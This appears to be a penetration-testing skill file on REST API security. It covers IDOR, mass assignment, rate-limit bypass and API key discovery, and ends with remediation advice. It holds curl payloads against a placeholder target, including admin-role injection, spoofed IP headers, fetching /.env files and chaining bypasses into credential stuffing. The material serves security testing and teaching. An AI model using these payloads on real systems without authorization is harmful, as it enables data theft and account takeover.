---
name: api_security
description: REST API vulnerability assessment and exploitation techniques
---

# API Security

## Attack Surface

- BOLA/IDOR: accessing resources by manipulating object IDs without authorization checks
- Mass assignment: injecting extra fields in request body to modify protected attributes
- Broken authentication: missing or weak token validation, API key in URL, no rate limiting on login
- Excessive data exposure: API responses returning full objects instead of filtered views
- Rate limit bypass: circumventing throttling via header spoofing or endpoint variation
- API key leakage: keys embedded in client-side code, URLs, or public repositories
- Broken function-level authorization: accessing admin endpoints from regular user context
- Improper inventory: undocumented or shadow API endpoints still reachable in production

## Detection Techniques

- Enumerate endpoints via OpenAPI/Swagger files: `/swagger.json`, `/openapi.json`, `/api-docs`
- Test IDOR by substituting numeric or UUID IDs in resource paths across user contexts
- Replay requests with missing or expired tokens to test authentication enforcement
- Inspect response payloads for sensitive fields (passwords, tokens, internal IDs)
- Fuzz request bodies with unexpected fields for mass assignment
- Test rate limits by sending rapid sequential requests with varying identifiers
- Search JavaScript bundles and mobile APKs for hardcoded API keys
- Walk API versions (`/v1/`, `/v2/`, `/v3/`) for deprecated but active endpoints

## Common Payloads

### BOLA/IDOR Testing
```bash
# Authenticated as user 1001, attempt to access user 1002's data
curl -H "Authorization: Bearer <user1001_token>" https://api.target.com/api/v1/users/1002
curl -H "Authorization: Bearer <user1001_token>" https://api.target.com/api/v1/orders/1002-0001

# UUID-based IDOR
curl -H "Authorization: Bearer <token>" https://api.target.com/api/v1/documents/550e8400-e29b-41d4-a716-446655440000
```

### Mass Assignment
```bash
# Inject admin role during user registration
curl -X POST https://api.target.com/api/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass123","role":"admin","is_verified":true}'

# Modify protected field during profile update
curl -X PUT https://api.target.com/api/v1/users/me \
  -H "Authorization: Bearer <token>" \
  -d '{"name":"attacker","balance":999999,"subscription":"premium"}'
```

### Rate Limit Bypass
```bash
# Header-based IP spoofing
curl -H "X-Forwarded-For: 127.0.0.1" https://api.target.com/api/v1/login
curl -H "X-Real-IP: 10.0.0.1" https://api.target.com/api/v1/login
curl -H "X-Originating-IP: 192.168.1.1" https://api.target.com/api/v1/login

# Case variation to bypass route-level rate limits
POST /api/v1/Login
POST /api/v1/LOGIN
POST /api/v1/login/
POST /api/v1/login?dummy=1
```

### API Key Discovery
```bash
# Common locations
curl https://target.com/js/app.bundle.js | grep -iE "api[_-]?key|apikey|authorization"
curl https://target.com/.env
curl https://target.com/config.json
```

## Bypass Techniques

- Wrap object IDs in arrays: `{"id": [1002]}` instead of `{"id": 1002}`
- Use parameter pollution: `/users/1002?id=1001&id=1002`
- Switch HTTP methods: GET vs POST vs PUT for the same endpoint
- Add JSON wrapping: send `{"id": "1002"}` when integer is expected
- URL-encode path segments: `/users/%31%30%30%32` for `/users/1002`
- Change `Content-Type` to bypass input validation: `application/xml` vs `application/json`
- Use GraphQL introspection when REST endpoints are locked down

## Exploit Chaining

- IDOR + excessive data exposure: extract PII from other users' full profile responses
- Mass assignment + broken auth: register with admin role, access admin panel
- API key leakage + BOLA: use discovered key to enumerate all customer records
- Rate limit bypass + credential stuffing: brute force login with IP rotation headers
- Swagger exposure + broken function-level auth: discover admin endpoints, call them as regular user

## Remediation

- Implement object-level authorization checks on every resource access
- Use allowlists for mass assignment; only permit explicitly declared fields
- Enforce server-side rate limiting with consistent client identification (not just IP)
- Strip sensitive fields from API responses; use DTOs or serializers
- Rotate API keys regularly; never embed in client-side code
- Disable Swagger/OpenAPI in production or restrict with authentication
- Implement proper RBAC and validate function-level permissions on every request
- Version APIs explicitly and decommission deprecated versions completely
